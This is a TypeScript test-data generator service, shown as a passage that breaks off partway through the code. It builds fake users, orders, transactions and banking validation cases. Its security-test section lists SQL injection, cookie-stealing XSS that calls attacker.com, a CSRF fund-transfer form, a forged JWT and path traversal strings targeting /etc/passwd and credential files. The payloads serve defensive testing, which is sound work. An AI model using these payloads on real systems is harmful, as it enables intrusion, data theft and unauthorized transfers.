/**
 * Test Data Management Service
 * Generates intelligent test data using templates and patterns
 */

import { randomUUID } from 'crypto';

export interface TestDataGenerationRequest {
  dataType: 'user' | 'product' | 'order' | 'transaction' | 'custom' | 'customJson' | 'boundaryValue' | 'equivalencePartition' | 'securityTest';
  count: number;
  schema?: Record<string, any>;
  locale?: string;
  options?: {
    includeEdgeCases?: boolean;
    includeNullValues?: boolean;
    includeSpecialChars?: boolean;
    fieldName?: string;
    fieldType?: string;
    minValue?: number;
    maxValue?: number;
    partitionType?: 'valid' | 'invalid' | 'boundary' | 'all';
  };
}

export interface TestDataset {
  id: string;
  name: string;
  dataType: string;
  records: any[];
  schema?: Record<string, any>;
  createdAt: Date;
  updatedAt: Date;
  userId: string;
}

export class TestDataService {
  private firstNames = ['John', 'Jane', 'Michael', 'Sarah', 'David', 'Emily', 'James', 'Emma', 'Robert', 'Olivia', 'William', 'Ava', 'Richard', 'Sophia', 'Joseph'];
  private lastNames = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez', 'Hernandez', 'Lopez', 'Wilson', 'Anderson', 'Thomas'];
  private cities = ['New York', 'Los Angeles', 'Chicago', 'Houston', 'Phoenix', 'Philadelphia', 'San Antonio', 'San Diego', 'Dallas', 'San Jose'];
  private states = ['NY', 'CA', 'IL', 'TX', 'AZ', 'PA', 'FL', 'OH', 'GA', 'NC'];
  private categories = ['Electronics', 'Clothing', 'Books', 'Home & Garden', 'Sports & Outdoors', 'Toys', 'Automotive', 'Health & Beauty', 'Food & Beverage', 'Office'];
  private productAdjectives = ['Premium', 'Professional', 'Deluxe', 'Ultra', 'Smart', 'Advanced', 'Classic', 'Modern', 'Eco-Friendly', 'Wireless'];
  private productNouns = ['Laptop', 'Phone', 'Tablet', 'Watch', 'Camera', 'Speaker', 'Headphones', 'Keyboard', 'Mouse', 'Monitor'];

  /**
   * Generate test data based on request
   */
  async generateTestData(request: TestDataGenerationRequest): Promise<{
    success: boolean;
    data: any[];
    metadata: {
      generatedCount: number;
      dataType: string;
      processingTime: number;
    };
  }> {
    const startTime = Date.now();
    const data: any[] = [];

    try {
      for (let i = 0; i < request.count; i++) {
        const record = this.generateRecord(request.dataType, i, request);
        data.push(record);
      }

      // Add edge cases if requested
      if (request.options?.includeEdgeCases && data.length > 0) {
        const edgeCases = this.generateEdgeCases(request.dataType);
        data.push(...edgeCases.slice(0, Math.min(3, request.count)));
      }

      return {
        success: true,
        data: data.slice(0, request.count),
        metadata: {
          generatedCount: data.length,
          dataType: request.dataType,
          processingTime: Date.now() - startTime
        }
      };
    } catch (error) {
      console.error('Test data generation error:', error);
      throw new Error('Failed to generate test data');
    }
  }

  /**
   * Generate a single record based on type
   */
  private generateRecord(dataType: string, index: number, request: TestDataGenerationRequest): any {
    switch (dataType) {
      case 'user':
        return this.generateUser(index, request.options);
      case 'product':
        return this.generateProduct(index, request.options);
      case 'order':
        return this.generateOrder(index, request.options);
      case 'transaction':
        return this.generateTransaction(index, request.options);
      case 'boundaryValue':
        return this.generateBoundaryValue(index, request.options);
      case 'equivalencePartition':
        return this.generateEquivalencePartition(index, request.options);
      case 'securityTest':
        return this.generateSecurityTest(index, request.options);
      case 'customJson':
        return this.generateCustomJson(index, request.schema, request.options);
      case 'custom':
        return this.generateCustom(index, request.schema, request.options);
      default:
        return this.generateUser(index, request.options);
    }
  }

  /**
   * Generate user test data
   */
  private generateUser(index: number, _options?: any): any {
    const firstName = this.randomChoice(this.firstNames);
    const lastName = this.randomChoice(this.lastNames);
    const domain = this.randomChoice(['gmail.com', 'yahoo.com', 'outlook.com', 'company.com']);
    
    return {
      id: randomUUID(),
      firstName,
      lastName,
      email: `${firstName.toLowerCase()}.${lastName.toLowerCase()}${index > 0 ? index : ''}@${domain}`,
      username: `${firstName.toLowerCase()}${lastName.toLowerCase()}${Math.floor(Math.random() * 1000)}`,
      phone: `+1${Math.floor(Math.random() * 9000000000 + 1000000000)}`,
      dateOfBirth: this.randomDate(new Date(1960, 0, 1), new Date(2005, 11, 31)),
      age: Math.floor(Math.random() * 50) + 18,
      address: {
        street: `${Math.floor(Math.random() * 9999) + 1} ${this.randomChoice(['Main', 'Oak', 'Maple', 'Elm', 'Pine'])} ${this.randomChoice(['St', 'Ave', 'Blvd', 'Dr'])}`,
        city: this.randomChoice(this.cities),
        state: this.randomChoice(this.states),
        zipCode: String(Math.floor(Math.random() * 90000) + 10000),
        country: 'USA'
      },
      role: this.randomChoice(['admin', 'user', 'guest', 'moderator']),
      status: this.randomChoice(['active', 'inactive', 'pending', 'suspended']),
      emailVerified: Math.random() > 0.3,
      preferences: {
        newsletter: Math.random() > 0.5,
        notifications: Math.random() > 0.3,
        theme: this.randomChoice(['light', 'dark', 'auto'])
      },
      createdAt: this.randomDate(new Date(2020, 0, 1), new Date()),
      lastLogin: this.randomDate(new Date(2024, 0, 1), new Date())
    };
  }

  /**
   * Generate product test data
   */
  private generateProduct(index: number, _options?: any): any {
    const adj = this.randomChoice(this.productAdjectives);
    const noun = this.randomChoice(this.productNouns);
    const category = this.randomChoice(this.categories);
    const price = Math.round((Math.random() * 1000 + 10) * 100) / 100;

    return {
      id: randomUUID(),
      name: `${adj} ${noun}`,
      description: `High-quality ${adj.toLowerCase()} ${noun.toLowerCase()} with excellent features and performance`,
      category,
      subCategory: this.randomChoice(['Featured', 'New Arrivals', 'Best Sellers', 'Clearance']),
      price,
      originalPrice: Math.round((price * (1 + Math.random() * 0.3)) * 100) / 100,
      currency: 'USD',
      sku: `SKU-${String(index + 1000).padStart(6, '0')}`,
      barcode: String(Math.floor(Math.random() * 9000000000000) + 1000000000000),
      stock: Math.floor(Math.random() * 200),
      rating: Math.round((Math.random() * 2 + 3) * 10) / 10,
      reviewCount: Math.floor(Math.random() * 500),
      imageUrl: `https://picsum.photos/400/400?random=${index}`,
      images: [
        `https://picsum.photos/400/400?random=${index}`,
        `https://picsum.photos/400/400?random=${index + 1000}`,
        `https://picsum.photos/400/400?random=${index + 2000}`
      ],
      tags: this.randomChoices(['new', 'sale', 'featured', 'bestseller', 'trending', 'limited'], Math.floor(Math.random() * 3) + 1),
      dimensions: {
        width: Math.round(Math.random() * 50 + 5),
        height: Math.round(Math.random() * 50 + 5),
        depth: Math.round(Math.random() * 50 + 5),
        unit: 'cm'
      },
      weight: Math.round((Math.random() * 10 + 0.1) * 100) / 100,
      weightUnit: 'kg',
      isActive: Math.random() > 0.1,
      isFeatured: Math.random() > 0.7,
      createdAt: this.randomDate(new Date(2023, 0, 1), new Date()),
      updatedAt: this.randomDate(new Date(2024, 0, 1), new Date())
    };
  }

  /**
   * Generate order test data
   */
  private generateOrder(index: number, _options?: any): any {
    const itemCount = Math.floor(Math.random() * 5) + 1;
    const items = [];
    let totalAmount = 0;

    for (let i = 0; i < itemCount; i++) {
      const quantity = Math.floor(Math.random() * 5) + 1;
      const price = Math.round((Math.random() * 200 + 10) * 100) / 100;
      items.push({
        productId: randomUUID(),
        productName: `${this.randomChoice(this.productAdjectives)} ${this.randomChoice(this.productNouns)}`,
        quantity,
        price,
        subtotal: Math.round(quantity * price * 100) / 100
      });
      totalAmount += quantity * price;
    }

    const tax = Math.round(totalAmount * 0.08 * 100) / 100;
    const shipping = Math.round((Math.random() * 20 + 5) * 100) / 100;
    totalAmount = Math.round((totalAmount + tax + shipping) * 100) / 100;

    const orderDateObj = new Date(Date.now() - Math.random() * 30 * 24 * 60 * 60 * 1000);
    const orderDate = orderDateObj.toISOString();
    const status = this.randomChoice(['pending', 'confirmed', 'processing', 'shipped', 'delivered', 'cancelled']);
    
    return {
      id: randomUUID(),
      orderNumber: `ORD-${String(index + 10000).padStart(8, '0')}`,
      userId: randomUUID(),
      items,
      subtotal: Math.round((totalAmount - tax - shipping) * 100) / 100,
      tax,
      shipping,
      totalAmount,
      currency: 'USD',
      status,
      paymentMethod: this.randomChoice(['credit_card', 'debit_card', 'paypal', 'bank_transfer', 'cash_on_delivery']),
      paymentStatus: this.randomChoice(['pending', 'completed', 'failed', 'refunded']),
      shippingAddress: {
        fullName: `${this.randomChoice(this.firstNames)} ${this.randomChoice(this.lastNames)}`,
        street: `${Math.floor(Math.random() * 9999) + 1} Shipping Lane`,
        city: this.randomChoice(this.cities),
        state: this.randomChoice(this.states),
        zipCode: String(Math.floor(Math.random() * 90000) + 10000),
        country: 'USA',
        phone: `+1${Math.floor(Math.random() * 9000000000 + 1000000000)}`
      },
      billingAddress: {
        fullName: `${this.randomChoice(this.firstNames)} ${this.randomChoice(this.lastNames)}`,
        street: `${Math.floor(Math.random() * 9999) + 1} Billing Ave`,
        city: this.randomChoice(this.cities),
        state: this.randomChoice(this.states),
        zipCode: String(Math.floor(Math.random() * 90000) + 10000),
        country: 'USA'
      },
      trackingNumber: status === 'shipped' || status === 'delivered' ? `TRK-${String(Math.floor(Math.random() * 9000000000) + 1000000000)}` : null,
      orderDate,
      confirmedAt: ['confirmed', 'processing', 'shipped', 'delivered'].includes(status) ? new Date(orderDateObj.getTime() + Math.random() * 86400000).toISOString() : null,
      shippedAt: ['shipped', 'delivered'].includes(status) ? new Date(orderDateObj.getTime() + Math.random() * 172800000).toISOString() : null,
      deliveredAt: status === 'delivered' ? new Date(orderDateObj.getTime() + Math.random() * 604800000).toISOString() : null,
      notes: Math.random() > 0.7 ? 'Please handle with care' : null
    };
  }

  /**
   * Generate transaction test data
   */
  private generateTransaction(index: number, _options?: any): any {
    const amount = Math.round((Math.random() * 5000 + 10) * 100) / 100;
    const transactionDateObj = new Date(Date.now() - Math.random() * 30 * 24 * 60 * 60 * 1000);
    const transactionDate = transactionDateObj.toISOString();
    const txStatus = this.randomChoice(['pending', 'completed', 'failed', 'cancelled']);
    
    return {
      id: randomUUID(),
      transactionId: `TXN-${String(index + 100000).padStart(10, '0')}`,
      userId: randomUUID(),
      orderId: randomUUID(),
      type: this.randomChoice(['payment', 'refund', 'chargeback', 'adjustment']),
      amount,
      currency: 'USD',
      status: txStatus,
      paymentMethod: this.randomChoice(['credit_card', 'debit_card', 'paypal', 'bank_transfer', 'wallet']),
      cardLast4: String(Math.floor(Math.random() * 9000) + 1000),
      cardBrand: this.randomChoice(['Visa', 'Mastercard', 'American Express', 'Discover']),
      gateway: this.randomChoice(['Stripe', 'PayPal', 'Square', 'Authorize.Net']),
      gatewayTransactionId: `GTW-${randomUUID()}`,
      description: `Payment for order #${Math.floor(Math.random() * 90000) + 10000}`,
      fee: Math.round(amount * 0.029 * 100) / 100,
      netAmount: Math.round((amount - (amount * 0.029)) * 100) / 100,
      transactionDate,
      completedAt: txStatus === 'completed' ? new Date(transactionDateObj.getTime() + Math.random() * 3600000).toISOString() : null,
      metadata: {
        ipAddress: `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
        userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        risk_score: Math.round(Math.random() * 100)
      }
    };
  }

  /**
   * Generate custom data based on schema
   */
  private generateCustom(index: number, schema?: Record<string, any>, _options?: any): any {
    if (!schema) {
      return {
        id: randomUUID(),
        field1: `value-${index}`,
        field2: Math.floor(Math.random() * 1000),
        field3: Math.random() > 0.5,
        createdAt: new Date().toISOString()
      };
    }

    const record: any = {};
    for (const [key, type] of Object.entries(schema)) {
      record[key] = this.generateFieldValue(type as string, index);
    }
    return record;
  }

  /**
   * Generate custom JSON data from template with {{faker.xxx}} syntax
   */
  private generateCustomJson(index: number, schema?: Record<string, any>, _options?: any): any {
    if (!schema) {
      return {
        id: randomUUID(),
        index,
        generated: true,
        timestamp: new Date().toISOString()
      };
    }

    return this.processFakerTemplate(schema, index);
  }

  /**
   * Process a template object/value with faker syntax
   */
  private processFakerTemplate(value: any, index: number): any {
    if (typeof value === 'string') {
      return this.replaceFakerPlaceholders(value, index);
    } else if (Array.isArray(value)) {
      return value.map(item => this.processFakerTemplate(item, index));
    } else if (typeof value === 'object' && value !== null) {
      const result: any = {};
      for (const [key, val] of Object.entries(value)) {
        result[key] = this.processFakerTemplate(val, index);
      }
      return result;
    }
    return value;
  }

  /**
   * Replace {{faker.xxx}} placeholders with generated values
   */
  private replaceFakerPlaceholders(template: string, index: number): any {
    const fakerRegex = /\{\{faker\.([^}]+)\}\}/g;
    let result: any = template;
    
    const matches = template.match(fakerRegex);
    if (!matches) return template;

    // If the entire string is just a faker placeholder, return the raw value
    if (matches.length === 1 && template === matches[0]) {
      const command = matches[0].replace(/\{\{faker\./, '').replace(/\}\}/, '');
      return this.executeFakerCommand(command, index);
    }

    // Otherwise, replace within the string
    result = template.replace(fakerRegex, (_match, command) => {
      const value = this.executeFakerCommand(command, index);
      return String(value);
    });

    return result;
  }

  /**
   * Execute a faker command and return the generated value
   */
  private executeFakerCommand(command: string, index: number): any {
    const cmd = command.trim();

    // {{faker.name}}
    if (cmd === 'name') {
      return `${this.randomChoice(this.firstNames)} ${this.randomChoice(this.lastNames)}`;
    }
    
    // {{faker.firstName}}
    if (cmd === 'firstName') {
      return this.randomChoice(this.firstNames);
    }
    
    // {{faker.lastName}}
    if (cmd === 'lastName') {
      return this.randomChoice(this.lastNames);
    }

    // {{faker.email}}
    if (cmd === 'email') {
      const first = this.randomChoice(this.firstNames).toLowerCase();
      const last = this.randomChoice(this.lastNames).toLowerCase();
      const domain = this.randomChoice(['gmail.com', 'yahoo.com', 'outlook.com', 'company.com']);
      return `${first}.${last}${index > 0 ? index : ''}@${domain}`;
    }

    // {{faker.phone}}
    if (cmd === 'phone') {
      return `+1${Math.floor(Math.random() * 9000000000 + 1000000000)}`;
    }

    // {{faker.uuid}}
    if (cmd === 'uuid') {
      return randomUUID();
    }

    // {{faker.boolean}}
    if (cmd === 'boolean') {
      return Math.random() > 0.5;
    }

    // {{faker.number(min-max)}}
    const numberMatch = cmd.match(/^number\((\d+)-(\d+)\)$/);
    if (numberMatch) {
      const min = parseInt(numberMatch[1], 10);
      const max = parseInt(numberMatch[2], 10);
      return Math.floor(Math.random() * (max - min + 1)) + min;
    }

    // {{faker.choice([A,B,C])}}
    const choiceMatch = cmd.match(/^choice\(\[([^\]]+)\]\)$/);
    if (choiceMatch) {
      const options = choiceMatch[1].split(',').map(s => s.trim());
      return this.randomChoice(options);
    }

    // {{faker.date(YYYY-YYYY)}}
    const dateMatch = cmd.match(/^date\((\d{4})-(\d{4})\)$/);
    if (dateMatch) {
      const startYear = parseInt(dateMatch[1], 10);
      const endYear = parseInt(dateMatch[2], 10);
      return this.randomDate(new Date(startYear, 0, 1), new Date(endYear, 11, 31));
    }

    // {{faker.city}}
    if (cmd === 'city') {
      return this.randomChoice(this.cities);
    }

    // {{faker.state}}
    if (cmd === 'state') {
      return this.randomChoice(this.states);
    }

    // {{faker.address}}
    if (cmd === 'address') {
      return `${Math.floor(Math.random() * 9999) + 1} ${this.randomChoice(['Main', 'Oak', 'Maple'])} St`;
    }

    // Default: return placeholder
    return `{{${cmd}}}`;
  }

  /**
   * Generate field value based on type
   */
  private generateFieldValue(type: string, index: number): any {
    const lowerType = type.toLowerCase();
    
    if (lowerType.includes('uuid') || lowerType.includes('id')) {
      return randomUUID();
    } else if (lowerType.includes('email')) {
      return `user${index}@example.com`;
    } else if (lowerType.includes('phone')) {
      return `+1${Math.floor(Math.random() * 9000000000 + 1000000000)}`;
    } else if (lowerType.includes('url')) {
      return `https://example.com/${index}`;
    } else if (lowerType.includes('date') || lowerType.includes('timestamp')) {
      return this.randomDate(new Date(2020, 0, 1), new Date());
    } else if (lowerType.includes('number') || lowerType.includes('int')) {
      return Math.floor(Math.random() * 1000);
    } else if (lowerType.includes('float') || lowerType.includes('decimal')) {
      return Math.round(Math.random() * 1000 * 100) / 100;
    } else if (lowerType.includes('bool')) {
      return Math.random() > 0.5;
    } else {
      return `value-${index}`;
    }
  }

  /**
   * Generate edge cases
   */
  private generateEdgeCases(dataType: string): any[] {
    const cases: any[] = [];

    if (dataType === 'user') {
      cases.push({
        id: randomUUID(),
        firstName: '',
        lastName: 'O\'Brien',
        email: 'test+special@example.com',
        username: 'a',
        phone: '+11234567890',
        dateOfBirth: '1900-01-01',
        age: 124,
        address: {
          street: '1 A',
          city: 'X',
          state: 'XX',
          zipCode: '00000',
          country: 'USA'
        },
        role: 'admin',
        status: 'active',
        emailVerified: false,
        preferences: {
          newsletter: false,
          notifications: false,
          theme: 'light'
        },
        createdAt: new Date('2020-01-01').toISOString(),
        lastLogin: new Date().toISOString()
      });
    } else if (dataType === 'product') {
      cases.push({
        id: randomUUID(),
        name: 'A',
        description: '',
        category: 'Electronics',
        subCategory: 'Featured',
        price: 0.01,
        originalPrice: 0.01,
        currency: 'USD',
        sku: 'SKU-000000',
        barcode: '0000000000000',
        stock: 0,
        rating: 0,
        reviewCount: 0,
        imageUrl: '',
        images: [],
        tags: [],
        dimensions: { width: 0, height: 0, depth: 0, unit: 'cm' },
        weight: 0.01,
        weightUnit: 'kg',
        isActive: false,
        isFeatured: false,
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString()
      });
    }

    return cases;
  }

  /**
   * Helper: Random choice from array
   */
  private randomChoice<T>(array: T[]): T {
    return array[Math.floor(Math.random() * array.length)];
  }

  /**
   * Helper: Random multiple choices from array
   */
  private randomChoices<T>(array: T[], count: number): T[] {
    const shuffled = [...array].sort(() => 0.5 - Math.random());
    return shuffled.slice(0, count);
  }

  /**
   * Helper: Random date between range
   */
  private randomDate(start: Date, end: Date): string {
    const timestamp = start.getTime() + Math.random() * (end.getTime() - start.getTime());
    return new Date(timestamp).toISOString();
  }

  /**
   * Generate Boundary Value Analysis test data
   * Tests values at boundaries (min, max, min-1, max+1, typical)
   */
  private generateBoundaryValue(index: number, options?: any): any {
    const fieldType = options?.fieldType || 'number';
    const fieldName = options?.fieldName || 'value';
    const minValue = options?.minValue ?? 0;
    const maxValue = options?.maxValue ?? 100;
    
    const boundaryTypes = [
      { type: 'min', description: 'Minimum valid value' },
      { type: 'min-1', description: 'Just below minimum (invalid)' },
      { type: 'min+1', description: 'Just above minimum (valid)' },
      { type: 'max', description: 'Maximum valid value' },
      { type: 'max+1', description: 'Just above maximum (invalid)' },
      { type: 'max-1', description: 'Just below maximum (valid)' },
      { type: 'typical', description: 'Typical value within range' },
      { type: 'zero', description: 'Zero value' },
      { type: 'negative', description: 'Negative value' }
    ];
    
    const boundaryType = boundaryTypes[index % boundaryTypes.length];
    let value: any;
    let isValid = true;
    
    if (fieldType === 'number') {
      switch (boundaryType.type) {
        case 'min':
          value = minValue;
          break;
        case 'min-1':
          value = minValue - 1;
          isValid = false;
          break;
        case 'min+1':
          value = minValue + 1;
          break;
        case 'max':
          value = maxValue;
          break;
        case 'max+1':
          value = maxValue + 1;
          isValid = false;
          break;
        case 'max-1':
          value = maxValue - 1;
          break;
        case 'zero':
          value = 0;
          isValid = minValue <= 0 && maxValue >= 0;
          break;
        case 'negative':
          value = -Math.abs(minValue);
          isValid = minValue < 0;
          break;
        default:
          value = Math.floor((minValue + maxValue) / 2);
      }
    } else if (fieldType === 'string') {
      const maxLength = maxValue || 255;
      switch (boundaryType.type) {
        case 'min':
          value = minValue === 0 ? '' : 'A'.repeat(minValue);
          break;
        case 'min-1':
          value = minValue > 0 ? 'A'.repeat(minValue - 1) : '';
          isValid = minValue === 0;
          break;
        case 'min+1':
          value = 'A'.repeat(minValue + 1);
          break;
        case 'max':
          value = 'A'.repeat(maxLength);
          break;
        case 'max+1':
          value = 'A'.repeat(maxLength + 1);
          isValid = false;
          break;
        case 'max-1':
          value = 'A'.repeat(maxLength - 1);
          break;
        case 'zero':
          value = '';
          isValid = minValue === 0;
          break;
        default:
          value = 'A'.repeat(Math.floor(maxLength / 2));
      }
    } else if (fieldType === 'date') {
      const minDate = new Date(minValue || Date.now() - 365 * 24 * 60 * 60 * 1000);
      const maxDate = new Date(maxValue || Date.now() + 365 * 24 * 60 * 60 * 1000);
      
      switch (boundaryType.type) {
        case 'min':
          value = minDate.toISOString();
          break;
        case 'min-1':
          value = new Date(minDate.getTime() - 86400000).toISOString();
          isValid = false;
          break;
        case 'max':
          value = maxDate.toISOString();
          break;
        case 'max+1':
          value = new Date(maxDate.getTime() + 86400000).toISOString();
          isValid = false;
          break;
        default:
          value = new Date((minDate.getTime() + maxDate.getTime()) / 2).toISOString();
      }
    }
    
    // Banking-specific boundary examples
    const bankingExamples = {
      transferAmount: [
        { value: 0.01, desc: 'Minimum transfer (1 cent)', isValid: true },
        { value: 0, desc: 'Zero transfer', isValid: false },
        { value: -0.01, desc: 'Negative transfer', isValid: false },
        { value: 999999.99, desc: 'Maximum single transfer', isValid: true },
        { value: 1000000, desc: 'Above single transfer limit', isValid: false },
        { value: 10000, desc: 'AML reporting threshold (US)', isValid: true }
      ],
      accountBalance: [
        { value: 0, desc: 'Zero balance', isValid: true },
        { value: -0.01, desc: 'Overdraft', isValid: false },
        { value: 999999999.99, desc: 'Maximum balance', isValid: true }
      ],
      age: [
        { value: 17, desc: 'Below minimum age', isValid: false },
        { value: 18, desc: 'Minimum age', isValid: true },
        { value: 120, desc: 'Maximum realistic age', isValid: true },
        { value: 121, desc: 'Above maximum age', isValid: false }
      ]
    };
    
    return {
      id: index,
      testType: 'boundary_value_analysis',
      fieldName,
      fieldType,
      boundaryType: boundaryType.type,
      description: boundaryType.description,
      value,
      isValid,
      expectedResult: isValid ? 'accept' : 'reject',
      range: { min: minValue, max: maxValue },
      bankingExamples: fieldName === 'amount' ? bankingExamples.transferAmount : []
    };
  }

  /**
   * Generate Equivalence Partitioning test data
   * Groups input values into valid and invalid partitions
   */
  private generateEquivalencePartition(index: number, options?: any): any {
    const fieldName = options?.fieldName || 'value';
    const partitionType = options?.partitionType || 'all';
    
    // Define common banking equivalence classes
    const bankingPartitions = {
      transferAmount: {
        validPartitions: [
          { range: '0.01 - 1000', example: 250, description: 'Small transfers' },
          { range: '1000.01 - 10000', example: 5000, description: 'Medium transfers' },
          { range: '10000.01 - 999999.99', example: 50000, description: 'Large transfers (AML threshold)' }
        ],
        invalidPartitions: [
          { range: '< 0', example: -100, description: 'Negative amount', errorCode: 'INVALID_AMOUNT' },
          { range: '0', example: 0, description: 'Zero amount', errorCode: 'ZERO_AMOUNT' },
          { range: '>= 1000000', example: 1500000, description: 'Above limit', errorCode: 'AMOUNT_EXCEEDS_LIMIT' }
        ]
      },
      accountType: {
        validPartitions: [
          { value: 'SAVINGS', description: 'Savings account' },
          { value: 'CURRENT', description: 'Current account' },
          { value: 'BUSINESS', description: 'Business account' },
          { value: 'PREMIER', description: 'Premier account' }
        ],
        invalidPartitions: [
          { value: 'INVALID', description: 'Invalid account type', errorCode: 'UNKNOWN_ACCOUNT_TYPE' },
          { value: '', description: 'Empty account type', errorCode: 'MISSING_ACCOUNT_TYPE' },
          { value: null, description: 'Null account type', errorCode: 'NULL_ACCOUNT_TYPE' }
        ]
      },
      customerAge: {
        validPartitions: [
          { range: '18-25', example: 22, description: 'Young adults' },
          { range: '26-60', example: 45, description: 'Working age' },
          { range: '61-120', example: 70, description: 'Senior citizens' }
        ],
        invalidPartitions: [
          { range: '< 18', example: 16, description: 'Minor', errorCode: 'BELOW_MINIMUM_AGE' },
          { range: '> 120', example: 150, description: 'Invalid age', errorCode: 'INVALID_AGE' },
          { range: 'negative', example: -5, description: 'Negative age', errorCode: 'NEGATIVE_AGE' }
        ]
      },
      iban: {
        validPartitions: [
          { example: 'GB82WEST12345698765432', description: 'Valid UK IBAN' },
          { example: 'DE89370400440532013000', description: 'Valid DE IBAN' },
          { example: 'FR1420041010050500013M02606', description: 'Valid FR IBAN' }
        ],
        invalidPartitions: [
          { example: 'GB82WEST123', description: 'Too short', errorCode: 'INVALID_IBAN_LENGTH' },
          { example: 'XX82WEST12345698765432', description: 'Invalid country code', errorCode: 'INVALID_COUNTRY_CODE' },
          { example: 'GB00WEST12345698765432', description: 'Invalid check digits', errorCode: 'INVALID_CHECK_DIGIT' }
        ]
      },
      currency: {
        validPartitions: [
          { value: 'GBP', description: 'British Pound' },
          { value: 'USD', description: 'US Dollar' },
          { value: 'EUR', description: 'Euro' },
          { value: 'HKD', description: 'Hong Kong Dollar' }
        ],
        invalidPartitions: [
          { value: 'XXX', description: 'Invalid currency code', errorCode: 'UNKNOWN_CURRENCY' },
          { value: 'US', description: 'Wrong format', errorCode: 'INVALID_FORMAT' },
          { value: '', description: 'Empty currency', errorCode: 'MISSING_CURRENCY' }
        ]
      }
    };
    
    const partition = bankingPartitions[fieldName as keyof typeof bankingPartitions] || bankingPartitions.transferAmount;
    
    let selectedPartition: any;
    let isValid: boolean;
    
    if (partitionType === 'valid' || (partitionType === 'all' && index % 2 === 0)) {
      selectedPartition = partition.validPartitions[index % partition.validPartitions.length];
      isValid = true;
    } else {
      selectedPartition = partition.invalidPartitions[index % partition.invalidPartitions.length];
      isValid = false;
    }
    
    return {
      id: index,
      testType: 'equivalence_partitioning',
      fieldName,
      partition: isValid ? 'valid' : 'invalid',
      partitionClass: selectedPartition.description,
      value: selectedPartition.example || selectedPartition.value,
      range: selectedPartition.range,
      isValid,
      expectedResult: isValid ? 'accept' : 'reject',
      errorCode: selectedPartition.errorCode || null,
      testScenario: `Test ${fieldName} with ${selectedPartition.description}`
    };
  }

  /**
   * Generate Security Test data
   * Covers SQL injection, XSS, authentication bypass, etc.
   */
  private generateSecurityTest(index: number, _options?: any): any {
    const securityTestTypes = [
      'sql_injection',
      'xss_attack',
      'auth_bypass',
      'session_hijacking',
      'csrf_attack',
      'path_traversal',
      'command_injection',
      'xxe_attack',
      'sensitive_data_exposure',
      'broken_authentication'
    ];
    
    const testType = securityTestTypes[index % securityTestTypes.length];
    let testData: any = {
      id: index,
      testType: 'security_test',
      attackType: testType,
      severity: 'high',
      owasp: '',
      payload: '',
      expectedBehavior: 'reject_and_sanitize',
      description: ''
    };
    
    switch (testType) {
      case 'sql_injection':
        const sqlPayloads = [
          { payload: "' OR '1'='1", target: 'login_username', description: 'Classic SQLi bypass' },
          { payload: "admin'--", target: 'username', description: 'Comment-based SQLi' },
          { payload: "' OR 1=1--", target: 'account_number', description: 'Boolean-based SQLi' },
          { payload: "'; DROP TABLE accounts--", target: 'search_query', description: 'Destructive SQLi' },
          { payload: "' UNION SELECT card_number, cvv, expiry FROM credit_cards--", target: 'user_id', description: 'UNION-based SQLi' },
          { payload: "1' AND SLEEP(5)--", target: 'transaction_id', description: 'Time-based blind SQLi' }
        ];
        const sqlTest = sqlPayloads[index % sqlPayloads.length];
        testData = {
          ...testData,
          payload: sqlTest.payload,
          targetField: sqlTest.target,
          description: sqlTest.description,
          owasp: 'A03:2021 - Injection',
          severity: 'critical',
          bankingImpact: 'Unauthorized access to customer accounts, data breach'
        };
        break;
        
      case 'xss_attack':
        const xssPayloads = [
          { payload: "<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>", description: 'Cookie stealing XSS' },
          { payload: "<img src=x onerror=\"fetch('https://attacker.com/steal?data='+btoa(document.body.innerHTML))\">", description: 'Data exfiltration XSS' },
          { payload: "<svg onload=alert('Account: '+document.getElementById('account-number').value)>", description: 'Account data theft' },
          { payload: "javascript:void(document.getElementById('transfer-amount').value='999999')", description: 'Transaction manipulation' },
          { payload: "<iframe src=\"javascript:fetch('/api/transfer',{method:'POST',body:JSON.stringify({to:'attacker',amount:99999})})\"></iframe>", description: 'Unauthorized transfer' }
        ];
        const xssTest = xssPayloads[index % xssPayloads.length];
        testData = {
          ...testData,
          payload: xssTest.payload,
          description: xssTest.description,
          owasp: 'A03:2021 - Injection (XSS)',
          severity: 'high',
          bankingImpact: 'Session hijacking, unauthorized transactions, credential theft'
        };
        break;
        
      case 'auth_bypass':
        const authPayloads = [
          { username: 'admin', password: "' OR '1'='1", method: 'SQL injection in password' },
          { username: 'admin', password: '', method: 'Empty password' },
          { token: 'eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.', method: 'None algorithm JWT' },
          { sessionId: '../../../admin/session', method: 'Path traversal' },
          { username: 'admin\x00', password: 'anything', method: 'Null byte injection' }
        ];
        const authTest = authPayloads[index % authPayloads.length];
        testData = {
          ...testData,
          payload: authTest,
          description: authTest.method,
          owasp: 'A07:2021 - Identification and Authentication Failures',
          severity: 'critical',
          bankingImpact: 'Complete account takeover, unauthorized access to all banking functions'
        };
        break;
        
      case 'session_hijacking':
        testData = {
          ...testData,
          payload: {
            stolenSessionId: 'a1b2c3d4e5f6g7h8i9j0',
            method: 'Session fixation',
            attack: 'Force user to use known session ID'
          },
          description: 'Session fixation attack',
          owasp: 'A07:2021 - Identification and Authentication Failures',
          severity: 'high',
          bankingImpact: 'Unauthorized access to active banking session'
        };
        break;
        
      case 'csrf_attack':
        testData = {
          ...testData,
          payload: {
            html: '<form action="https://bank.com/api/transfer" method="POST"><input name="to" value="attacker"><input name="amount" value="99999"></form><script>document.forms[0].submit()</script>',
            targetEndpoint: '/api/transfer',
            method: 'POST without CSRF token'
          },
          description: 'Cross-Site Request Forgery for fund transfer',
          owasp: 'A01:2021 - Broken Access Control',
          severity: 'critical',
          bankingImpact: 'Unauthorized money transfers when user visits malicious site'
        };
        break;
        
      case 'path_traversal':
        const pathPayloads = [
          { payload: '../../../etc/passwd', description: 'Unix password file' },
          { payload: '..\\..\\..\\windows\\system32\\config\\sam', description: 'Windows SAM file' },
          { payload: '../../../app/config/database.yml', description: 'Database credentials' },
          { payload: '../../logs/transactions.log', description: 'Transaction logs' },
          { payload: '../../../customers/accounts.db', description: 'Customer database' }
        ];
        const pathTest = pathPayloads[index % pathPayloads.length];
        testData = {
          ...testData,
          payload: pathTest.payload,
